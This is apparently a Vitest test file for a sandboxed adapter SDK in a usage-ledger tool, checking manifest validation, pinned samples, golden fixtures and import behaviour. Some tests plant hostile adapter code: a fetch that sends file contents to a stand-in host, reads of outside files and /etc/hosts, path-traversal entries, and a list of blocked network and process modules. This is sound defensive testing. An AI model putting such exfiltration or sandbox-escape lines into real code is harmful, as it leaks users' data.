import { spawnSync } from "node:child_process";
import { cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { createHash } from "node:crypto";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import { verifyChain } from "../../src/desk/ledger/chain.ts";
import { openLedger } from "../../src/desk/ledger/db.ts";
import { LIMITS_ADAPTER, loadAdapters, parseManifest, runInSandbox, sandboxAvailable, testAdapter } from "../../src/desk/open/adapter.ts";
import { adaptersCommand } from "../../src/desk/open/command.ts";
import { loadSnapshot } from "../../src/desk/pricing/pricebook.ts";

/**
 * The adapter SDK (DF-063): an adapter is loaded only if its manifest is sound, its sample is the pinned file, every golden output is reproduced twice over, and `detect` claims
 * its own tool's file and nothing else; and it runs in a sandbox. Every refusal below is a folder built to fail in that one way.
 */
const snapshot = loadSnapshot("data/prices/anthropic-litellm-2026-10-22.json");
const REFERENCE = "adapters/example-usage-jsonl";
const sha = (s: string | Buffer): string => createHash("sha256").update(s).digest("hex");

let work: string;
beforeAll(() => {
  work = mkdtempSync(join(tmpdir(), "desk-adapter-"));
});
afterAll(() => rmSync(work, { recursive: true, force: true }));

let counter = 0;
/** A copy of the reference adapter, changed by `edit`, in its own folder. */
function variant(edit: (dir: string, manifest: Record<string, any>) => void): string {
  counter += 1;
  const dir = join(work, `adapter-${counter}`);
  cpSync(REFERENCE, dir, { recursive: true });
  const m = JSON.parse(readFileSync(join(dir, "adapter.json"), "utf8")) as Record<string, any>;
  edit(dir, m);
  writeFileSync(join(dir, "adapter.json"), JSON.stringify(m, null, 2));
  return dir;
}

describe("the sandbox", () => {
  it("is available on this Node, and says why when it is not", () => {
    expect(sandboxAvailable()).toEqual({ ok: true, reason: "" });
  });

  const probe = (body: string): Record<string, string> => {
    const dir = variant((d) => {
      writeFileSync(join(d, "adapter.mjs"), `import { readFileSync, writeFileSync } from "node:fs";\nexport default { detect() { return true; }, async parse() { const r = {};\n${body}\nreturn { sessions: [], calls: [], notes: [JSON.stringify(r)] }; } };\n`);
    });
    const a = { dir, entryUrl: new URL(`file:///${join(dir, "adapter.mjs").replace(/\\/g, "/")}`).href };
    const r = runInSandbox<{ notes: string[] }>(a, "parse", "x", "x");
    expect(r.ok, r.error).toBe(true);
    return JSON.parse(r.out!.notes[0]!) as Record<string, string>;
  };

  it("lets an adapter read its own folder and nothing else, and write nowhere", () => {
    const secretFile = join(work, "outside-secret.txt");
    writeFileSync(secretFile, "do not read");
    const r = probe(`
      try { readFileSync(${JSON.stringify(join(process.cwd(), "package.json"))}); r.readRepo = "READ"; } catch (e) { r.readRepo = e.code; }
      try { readFileSync(${JSON.stringify(secretFile)}); r.readOutside = "READ"; } catch (e) { r.readOutside = e.code; }
      try { writeFileSync(${JSON.stringify(join(work, "written-by-adapter.txt"))}, "x"); r.write = "WROTE"; } catch (e) { r.write = e.code; }
      try { writeFileSync("adapter-wrote-here.txt", "x"); r.writeCwd = "WROTE"; } catch (e) { r.writeCwd = e.code; }
    `);
    expect(r).toEqual({ readRepo: "ERR_ACCESS_DENIED", readOutside: "ERR_ACCESS_DENIED", write: "ERR_ACCESS_DENIED", writeCwd: "ERR_ACCESS_DENIED" });
    expect(existsSync(join(work, "written-by-adapter.txt"))).toBe(false);
  });

  it("keeps the network, child processes, workers and the global fetch out of reach", () => {
    const r = probe(`
      for (const m of ["node:net", "node:http", "node:https", "node:http2", "node:dgram", "node:dns", "node:tls", "node:child_process", "node:worker_threads", "node:cluster", "node:module", "node:vm", "node:http2", "node:inspector", "node:perf_hooks", "node:v8", "net", "http", "http2", "left-pad"]) {
        try { await import(m); r[m] = "LOADED"; } catch { r[m] = "blocked"; }
      }
      r.fetch = typeof globalThis.fetch;
      r.websocket = typeof globalThis.WebSocket;
      try { r.binding = typeof process.binding("tcp_wrap"); } catch (e) { r.binding = "blocked"; }
      try { process.dlopen({ exports: {} }, "x.node"); r.dlopen = "ran"; } catch (e) { r.dlopen = "blocked"; }
    `);
    for (const k of ["node:net", "node:http", "node:https", "node:http2", "node:dgram", "node:dns", "node:tls", "node:child_process", "node:worker_threads", "node:cluster", "node:module", "node:vm", "node:http2", "node:inspector", "node:perf_hooks", "node:v8", "net", "http", "http2", "left-pad"]) expect(r[k], k).toBe("blocked");
    expect(r["fetch"]).toBe("undefined");
    expect(r["websocket"]).toBe("undefined");
    expect(r["binding"]).toBe("blocked");
    expect(r["dlopen"]).toBe("blocked");
  });

  it("stops an adapter that never finishes, and one that fills the output", () => {
    const loop = variant((d) => writeFileSync(join(d, "adapter.mjs"), "export default { detect() { return true; }, parse() { for (;;) {} } };\n"));
    const a = { dir: loop, entryUrl: new URL(`file:///${join(loop, "adapter.mjs").replace(/\\/g, "/")}`).href };
    const t0 = Date.now();
    const r = runInSandbox(a, "parse", "x", "x", { runMs: 1500 });
    expect(r.ok).toBe(false);
    expect(r.error).toMatch(/did not finish in 1.5 seconds and was stopped/);
    expect(Date.now() - t0).toBeLessThan(10_000);
  });

  it("reports an adapter that throws, with its message, and an entry that does not export an adapter", () => {
    const boom = variant((d) => writeFileSync(join(d, "adapter.mjs"), 'export default { detect() { return true; }, parse() { throw new Error("cannot read this version of the format"); } };\n'));
    const r = runInSandbox({ dir: boom, entryUrl: new URL(`file:///${join(boom, "adapter.mjs").replace(/\\/g, "/")}`).href }, "parse", "x", "x");
    expect(r).toEqual({ ok: false, error: "cannot read this version of the format" });
    const none = variant((d) => writeFileSync(join(d, "adapter.mjs"), "export const nothing = 1;\n"));
    expect(runInSandbox({ dir: none, entryUrl: new URL(`file:///${join(none, "adapter.mjs").replace(/\\/g, "/")}`).href }, "detect", "x", "x").error).toMatch(/must export an object as its default export/);
  });
});

describe("the manifest", () => {
  const good = JSON.parse(readFileSync(join(REFERENCE, "adapter.json"), "utf8")) as Record<string, any>;
  it("accepts the reference adapter's, and says which field is wrong in the others", () => {
    expect(parseManifest(good).ok).toBe(true);
    const bad = (edit: (m: Record<string, any>) => void, why: RegExp): void => {
      const m = JSON.parse(JSON.stringify(good)) as Record<string, any>;
      edit(m);
      const r = parseManifest(m);
      expect(r.ok).toBe(false);
      expect(r.ok === false && r.error).toMatch(why);
    };
    bad((m) => (m["id"] = "Bad Id"), /id must be 2 to 40/);
    bad((m) => (m["version"] = "one"), /version must be a version such as 1.0.0/);
    bad((m) => (m["schema"] = "desk.events/2"), /schema must be "desk.events\/1"/);
    bad((m) => (m["entry"] = "adapter.js"), /entry must name a .mjs file/);
    bad((m) => (m["extra"] = 1), /field "extra" that is not known/);
    bad((m) => delete m["license"], /license must be a licence/);
    bad((m) => (m["sample"]["sha256"] = "abc"), /sample.sha256 must be/);
    bad((m) => (m["sample"]["kind"] = "imagined"), /sample.kind must be "real"/);
    bad((m) => (m["sample"]["origin"] = ""), /sample.origin must say where/);
    bad((m) => (m["sample"]["capturedAt"] = "last week"), /sample.capturedAt must be a date/);
    bad((m) => (m["sample"]["colour"] = 1), /sample has a field "colour"/);
    bad((m) => (m["fixtures"] = []), /fixtures must list from 1 to 20/);
    bad((m) => (m["fixtures"] = [{ input: "a" }]), /fixtures\[0\] must be/);
    expect(parseManifest([]).ok).toBe(false);
  });
});

describe("loading an adapter", () => {
  it("loads the reference adapter, marks it illustrative, and reproduces both golden files on two runs", () => {
    const t = testAdapter(REFERENCE);
    expect(t.refusal).toBeNull();
    expect(t.loaded).not.toBeNull();
    expect(t.illustrative).toBe(true);
    expect(t.fixtures.map((f) => [f.input, f.ok])).toEqual([["fixtures/sample.jsonl", true], ["fixtures/edge.jsonl", true]]);
    expect(t.fixtures[0]!.detail).toBe("7 records, identical to fixtures/sample.jsonl.golden.jsonl on two runs");
    expect(t.notes[0]).toMatch(/marked constructed.*will not import/);
  });

  it("refuses a folder with no manifest, a manifest that is not JSON, and a manifest that is not valid", () => {
    expect(testAdapter(join(work, "does-not-exist")).refusal).toMatch(/there is no adapter.json/);
    const raw = join(work, "raw-bad");
    mkdirSync(raw);
    writeFileSync(join(raw, "adapter.json"), "{ not json");
    expect(testAdapter(raw).refusal).toMatch(/adapter.json is not valid JSON/);
    expect(testAdapter(variant((_d, m) => (m["id"] = "X"))).refusal).toMatch(/id must be 2 to 40/);
  });

  it("refuses an adapter whose fixture output differs from its golden, and says where", () => {
    const dir = variant((d) => {
      const g = join(d, "fixtures", "sample.jsonl.golden.jsonl");
      writeFileSync(g, readFileSync(g, "utf8").replace('"input_tokens":1200', '"input_tokens":1201'));
    });
    const t = testAdapter(dir);
    expect(t.loaded).toBeNull();
    expect(t.refusal).toBe("a fixture failed, so the adapter is not loaded");
    expect(t.fixtures[0]!.detail).toMatch(/the output differs from fixtures\/sample.jsonl.golden.jsonl at line 4: got .*"input_tokens":1200.*expected .*"input_tokens":1201/);
  });

  it("refuses a sample that is not the file the manifest pins, a missing file, and a sample no fixture runs on", () => {
    expect(testAdapter(variant((d) => writeFileSync(join(d, "fixtures", "sample.jsonl"), "changed\n"))).refusal).toMatch(/is not the file the manifest pins \(its SHA-256 differs\)/);
    expect(testAdapter(variant((d) => rmSync(join(d, "fixtures", "sample.jsonl")))).refusal).toMatch(/sample fixtures\/sample.jsonl is missing/);
    expect(testAdapter(variant((d) => rmSync(join(d, "fixtures", "edge.jsonl.golden.jsonl")))).refusal).toMatch(/or its golden fixtures\/edge.jsonl.golden.jsonl is missing/);
    expect(testAdapter(variant((_d, m) => (m["fixtures"] = [m["fixtures"][1]]))).refusal).toMatch(/no fixture runs on the sample/);
  });

  it("refuses a path that leaves the adapter's folder", () => {
    expect(testAdapter(variant((_d, m) => (m["entry"] = "../adapter.mjs"))).refusal).toMatch(/entry \(\.\.\/adapter.mjs\) points outside the adapter's folder/);
    expect(testAdapter(variant((_d, m) => (m["sample"]["file"] = "/etc/hosts"))).refusal).toMatch(/points outside the adapter's folder/);
    expect(testAdapter(variant((_d, m) => (m["fixtures"][0]["golden"] = "fixtures/../../x"))).refusal).toMatch(/points outside the adapter's folder/);
  });

  it("refuses a detect that claims files that are not its tool's, or that does not recognise its own sample", () => {
    const greedy = variant((d) => {
      writeFileSync(join(d, "adapter.mjs"), readFileSync(join(REFERENCE, "adapter.mjs"), "utf8").replace(/detect\(head\) \{[\s\S]*?\n  \},\n\n  \/\/ Turn/, "detect() { return true; },\n\n  // Turn"));
    });
    expect(testAdapter(greedy).refusal).toMatch(/detect says it recognises an empty file; an adapter that claims files that are not its tool's is not loaded/);
    const blind = variant((d) => writeFileSync(join(d, "adapter.mjs"), readFileSync(join(REFERENCE, "adapter.mjs"), "utf8").replace(/detect\(head\) \{[\s\S]*?\n  \},\n\n  \/\/ Turn/, "detect() { return false; },\n\n  // Turn")));
    expect(testAdapter(blind).refusal).toMatch(/detect does not recognise the sample it was built from/);
  });

  it("refuses a parse that is not deterministic, and one whose output is not valid desk.events/1", () => {
    const src = readFileSync(join(REFERENCE, "adapter.mjs"), "utf8");
    const random = variant((d) => writeFileSync(join(d, "adapter.mjs"), src.replace("return { sessions: [...sessions.values()], calls, notes };", "return { sessions: [...sessions.values()], calls: calls.map((c) => ({ ...c, request_id: String(Math.random()) })), notes };")));
    const t = testAdapter(random);
    // The golden (made without the random field) no longer matches either, which is the earlier refusal; the point is that it is not loaded.
    expect(t.loaded).toBeNull();
    const invalid = variant((d) => writeFileSync(join(d, "adapter.mjs"), src.replace("input_tokens: o.in, output_tokens: o.out }", "input_tokens: -1, output_tokens: o.out }")));
    const t2 = testAdapter(invalid);
    expect(t2.loaded).toBeNull();
    expect(t2.fixtures[0]!.detail).toMatch(/the adapter's output is not valid desk.events\/1: record \d+, input_tokens: input_tokens must be a whole number/);
  });

  it("refuses an adapter that reaches for the network or the disk, because its fixtures fail", () => {
    const src = readFileSync(join(REFERENCE, "adapter.mjs"), "utf8");
    const net = variant((d) => writeFileSync(join(d, "adapter.mjs"), `import net from "node:net";\n${src}`));
    expect(testAdapter(net).fixtures[0]!.detail).toMatch(/the adapter may not import "node:net"/);
    const exfil = variant((d) => writeFileSync(join(d, "adapter.mjs"), src.replace("parse(text) {", 'parse(text) {\n    void fetch("https://collector.invalid/" + encodeURIComponent(text));')));
    expect(testAdapter(exfil).loaded).toBeNull();
    const reads = variant((d) => writeFileSync(join(d, "adapter.mjs"), `import { readFileSync } from "node:fs";\n${src.replace("parse(text) {", `parse(text) {\n    readFileSync(${JSON.stringify(join(process.cwd(), "package.json"))});`)}`));
    expect(testAdapter(reads).fixtures[0]!.detail).toMatch(/ERR_ACCESS_DENIED|Access to this API has been restricted/);
  });

  it("tests every folder under a root and loads the ones that pass", () => {
    const root = join(work, "root");
    mkdirSync(root);
    cpSync(REFERENCE, join(root, "good-one"), { recursive: true });
    cpSync(REFERENCE, join(root, "broken-one"), { recursive: true });
    writeFileSync(join(root, "broken-one", "fixtures", "sample.jsonl"), "tampered\n");
    mkdirSync(join(root, "_template"));
    const set = loadAdapters(root);
    expect(set.tested.map((t) => [t.dir.split(/[\\/]/).pop(), t.loaded !== null])).toEqual([["broken-one", false], ["good-one", true]]);
    expect(set.loaded).toHaveLength(1);
    expect(loadAdapters(join(work, "nowhere")).tested).toEqual([]);
  });
});

describe("using an adapter", () => {
  /** A copy of the reference adapter whose sample is marked real, because only an adapter built from a real file imports. */
  const realCopy = (): string =>
    variant((_d, m) => {
      m["id"] = "acme-real";
      m["sample"]["kind"] = "real";
      m["sample"]["origin"] = "Test copy of the reference adapter, marked real so that the import path can be tried.";
      // The golden files carry the adapter's id in their header.
      for (const f of ["sample.jsonl.golden.jsonl", "edge.jsonl.golden.jsonl"]) {
        const g = join(_d, "fixtures", f);
        writeFileSync(g, readFileSync(g, "utf8").replace('"tool":"example-usage-jsonl"', '"tool":"acme-real"'));
      }
    });

  it("will not import with an adapter whose sample is made up, and says so", async () => {
    const db = openLedger(":memory:");
    const r = await adaptersCommand(["import", REFERENCE, join(REFERENCE, "fixtures", "sample.jsonl")], db, { snapshot });
    expect(r.ok).toBe(false);
    expect(r.text).toMatch(/was built from a sample marked constructed; only an adapter built from a real file imports/);
    expect(db.prepare("SELECT COUNT(*) AS n FROM model_call").get()).toEqual({ n: 0 });
    db.close();
  });

  it("reads a file with a real-sample adapter into the ledger, prints what it skipped, and leaves the chain intact", async () => {
    const db = openLedger(":memory:");
    const dir = realCopy();
    const r = await adaptersCommand(["import", dir, join(REFERENCE, "fixtures", "edge.jsonl")], db, { snapshot });
    expect(r.ok, r.text).toBe(true);
    expect(r.text).toContain("edge.jsonl (read by adapter acme-real 0.1.0):");
    expect(r.text).toContain("Read 1 session and 2 calls from acme-real: 2 new, 0 already held.");
    expect(r.text).toContain("adapter note: line 3: not a usage record, skipped");
    expect(r.text).toContain("adapter note: line 5: not JSON, skipped");
    expect(db.prepare("SELECT call_id FROM model_call ORDER BY call_id").all()).toEqual([{ call_id: "ev:acme-real:e-1" }, { call_id: "ev:acme-real:e-3" }]);
    const again = await adaptersCommand(["import", dir, join(REFERENCE, "fixtures", "edge.jsonl")], db, { snapshot });
    expect(again.text).toContain("0 new, 2 already held");
    expect(verifyChain(db).ok).toBe(true);
    db.close();
  });

  it("says when a file is not the adapter's tool's, when a file is missing, and when the adapter is not loaded", async () => {
    const db = openLedger(":memory:");
    const dir = realCopy();
    const other = join(work, "not-acme.jsonl");
    writeFileSync(other, '{"hello":"world"}\n');
    const wrong = await adaptersCommand(["import", dir, other], db, { snapshot });
    expect(wrong).toMatchObject({ ok: false });
    expect(wrong.text).toMatch(/acme-real does not recognise .* as a Acme CLI \(made-up example\) file/);
    expect((await adaptersCommand(["import", dir, join(work, "nope.jsonl")], db, { snapshot })).text).toMatch(/nope.jsonl: no such file/);
    const broken = variant((d) => writeFileSync(join(d, "fixtures", "sample.jsonl"), "x\n"));
    const refused = await adaptersCommand(["import", broken, other], db, { snapshot });
    expect(refused.text).toMatch(/^The adapter is not loaded, so nothing was read\./);
    expect(db.prepare("SELECT COUNT(*) AS n FROM model_call").get()).toEqual({ n: 0 });
    db.close();
  });

  it("refuses a file larger than an adapter reads", async () => {
    const db = openLedger(":memory:");
    const big = join(work, "big.jsonl");
    writeFileSync(big, Buffer.alloc(LIMITS_ADAPTER.fileBytes + 1, 0x20));
    const r = await adaptersCommand(["import", realCopy(), big], db, { snapshot });
    expect(r.text).toMatch(/an adapter reads at most 67,108,864\. Split the file\./);
    db.close();
  });

  it("starts a new adapter from a sample, pins its hash, writes a golden only on request and never over one that exists", async () => {
    const sample = join(work, "mine.log");
    writeFileSync(sample, '{"acme_usage":1,"id":"z1","at":"2026-10-22T09:00:00Z","session":"zs","model":"claude-opus-5","in":3,"out":4}\n');
    const dir = join(work, "new-adapter");
    const made = await adaptersCommand(["init", dir], null, { snapshot, id: "mine-cli", toolName: "Mine CLI", sample, origin: "Mine CLI 1.0, captured 2026-10-22 from a real session", kind: "real", now: new Date("2026-10-25T00:00:00Z") });
    expect(made.ok, made.text).toBe(true);
    const m = JSON.parse(readFileSync(join(dir, "adapter.json"), "utf8")) as { sample: { sha256: string; kind: string; capturedAt: string }; fixtures: { golden: string }[] };
    expect(m.sample).toMatchObject({ sha256: sha(readFileSync(sample)), kind: "real", capturedAt: "2026-10-25" });
    expect((await adaptersCommand(["init", dir], null, { snapshot, id: "mine-cli", toolName: "Mine CLI", sample, origin: "x" })).text).toMatch(/already holds an adapter/);
    // The stub recognises nothing, so the first test says what is missing; once the author writes the adapter the golden can be made from it, read, and kept.
    expect((await adaptersCommand(["test", dir], null, { snapshot })).text).toMatch(/golden fixtures\/mine.log.golden.jsonl is missing|or its golden/);
    writeFileSync(join(dir, "adapter.mjs"), readFileSync(join(REFERENCE, "adapter.mjs"), "utf8"));
    const golden = await adaptersCommand(["test", dir], null, { snapshot, writeGolden: true });
    expect(golden.ok, golden.text).toBe(true);
    expect(golden.text).toMatch(/Wrote fixtures\/mine.log.golden.jsonl from the adapter's own output \(3 records\). Read it against fixtures\/mine.log line by line/);
    expect(golden.text).toContain("LOADED   mine-cli");
    const keep = readFileSync(join(dir, m.fixtures[0]!.golden), "utf8");
    writeFileSync(join(dir, m.fixtures[0]!.golden), keep.replace("z1", "z1-edited"));
    const again = await adaptersCommand(["test", dir], null, { snapshot, writeGolden: true });
    expect(again.text).toMatch(/exists and was left alone/);
    expect(again.ok).toBe(false); // the edited golden no longer matches, and the test says so rather than rewriting it
    await expect(adaptersCommand(["init", join(work, "x")], null, { snapshot })).rejects.toThrow(/Use: desk adapters init/);
  });

  it("lists the adapters of a folder, or says there are none", async () => {
    const list = await adaptersCommand(["list", "adapters"], null, { snapshot });
    expect(list.ok).toBe(true);
    expect(list.text).toContain("LOADED   example-usage-jsonl  (illustrative: tested, will not import)");
    expect(list.text).toContain("1 of 1 adapters loaded. An adapter that fails its fixtures is not loaded.");
    expect((await adaptersCommand(["list", join(work, "empty-root")], null, { snapshot })).text).toMatch(/No adapters folder at/);
    await expect(adaptersCommand(["bogus"], null, { snapshot })).rejects.toThrow(/Use: desk adapters/);
    await expect(adaptersCommand(["test"], null, { snapshot })).rejects.toThrow(/Use: desk adapters test/);
  });
});

describe("through the real command line", () => {
  it("exports events from a ledger file, validates them, and lists the shipped adapter", () => {
    const db = join(work, "cli-ledger.db");
    const l = openLedger(db);
    l.close();
    const run = (...a: string[]) => spawnSync(process.execPath, ["--import", "tsx", "src/desk/cli.ts", ...a, "--db", db], { encoding: "utf8" });
    const list = run("adapters", "list");
    expect(list.status, list.stderr).toBe(0);
    expect(list.stdout).toContain("LOADED   example-usage-jsonl");
    const sample = run("adapters", "test", REFERENCE);
    expect(sample.status).toBe(0);
    expect(sample.stdout).toContain("ok   fixtures/sample.jsonl: 7 records");
    const validate = run("events", "validate", join(REFERENCE, "fixtures", "sample.jsonl.golden.jsonl"));
    expect(validate.status).toBe(0);
    expect(validate.stdout).toContain("valid desk.events/1: header from example-usage-jsonl, 2 sessions, 4 calls.");
    const bad = join(work, "cli-bad.jsonl");
    writeFileSync(bad, '{"type":"call"}\n');
    const invalid = run("events", "validate", bad);
    expect(invalid.status).toBe(1);
    expect(invalid.stdout).toMatch(/line 1, type: the first record must be the header/);
    const imported = run("events", "import", join(REFERENCE, "fixtures", "sample.jsonl.golden.jsonl"));
    expect(imported.status, imported.stderr).toBe(0);
    expect(imported.stdout).toContain("Read 2 sessions and 4 calls from example-usage-jsonl: 4 new, 0 already held.");
    expect(imported.stdout).toContain("1 carry a cost the tool reported");
    const out = join(work, "cli-export.jsonl");
    const exported = run("events", "export", "--output", out);
    expect(exported.status, exported.stderr).toBe(0);
    expect(exported.stdout).toContain("Wrote 4 calls in 2 sessions");
    expect(existsSync(out)).toBe(true);
  }, 180_000);
});
